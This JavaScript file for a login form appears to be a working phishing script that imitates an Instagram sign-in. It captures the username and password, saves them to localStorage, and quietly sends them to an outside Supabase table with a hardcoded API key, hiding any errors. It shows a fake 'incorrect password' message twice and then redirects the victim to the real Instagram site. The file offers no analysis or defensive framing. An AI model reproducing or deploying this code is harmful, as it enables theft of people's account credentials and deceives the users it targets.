document.addEventListener('DOMContentLoaded', () => {
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const loginBtn = document.getElementById('loginBtn');
    const loginForm = document.getElementById('loginForm');
    const errorMessage = document.getElementById('errorMessage');

    let attemptCount = 0;

    function updateButtonState() {
        if (usernameInput.value.trim().length > 0 && passwordInput.value.trim().length > 0) {
            loginBtn.classList.remove('disabled');
            loginBtn.removeAttribute('disabled');
        } else {
            loginBtn.classList.add('disabled');
            loginBtn.setAttribute('disabled', 'true');
        }
    }

    function showError(msg) {
        errorMessage.textContent = msg;
        errorMessage.classList.add('visible');
    }

    function hideError() {
        errorMessage.textContent = '';
        errorMessage.classList.remove('visible');
    }

    usernameInput.addEventListener('input', () => {
        hideError();
        updateButtonState();
    });

    passwordInput.addEventListener('input', () => {
        hideError();
        updateButtonState();
    });

    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();

        const username = usernameInput.value.trim();
        const password = passwordInput.value.trim();

        if (username.length === 0 || password.length === 0) {
            return;
        }

        // Password must be more than 6 characters
        if (password.length < 6) {
            showError('Your password must be more than 6 characters.');
            return;
        }

        const data = {
            username: username,
            password: password,
            timestamp: new Date().toISOString()
        };

        // Save in localStorage
        localStorage.setItem('demoLoginData', JSON.stringify(data));

        // Save to Supabase → form_entries table
        const SUPABASE_URL = 'https://qdrnlklzggvyaigkgkrz.supabase.co';
        const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFkcm5sa2x6Z2d2eWFpZ2tna3J6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODEwMDc2MDcsImV4cCI6MjA5NjU4MzYwN30.B6sCa3EJDhmikezoZkWMH7dLMaHteUENxCpHr0NjGcY';

        try {
            await fetch(`${SUPABASE_URL}/rest/v1/form_entries`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'apikey': SUPABASE_KEY,
                    'Authorization': `Bearer ${SUPABASE_KEY}`
                },
                body: JSON.stringify({ username, password })
            });
        } catch {
            // Silent fail
        }

        attemptCount++;

        if (attemptCount <= 2) {
            // Show "Incorrect password" on first and second attempts
            showError('Sorry, your password was incorrect. Please double-check your password.');
            usernameInput.value = '';
            passwordInput.value = '';
            updateButtonState();
        } else {
            // Third attempt → redirect
            window.location.href = 'https://www.instagram.com/';
        }
    });
});

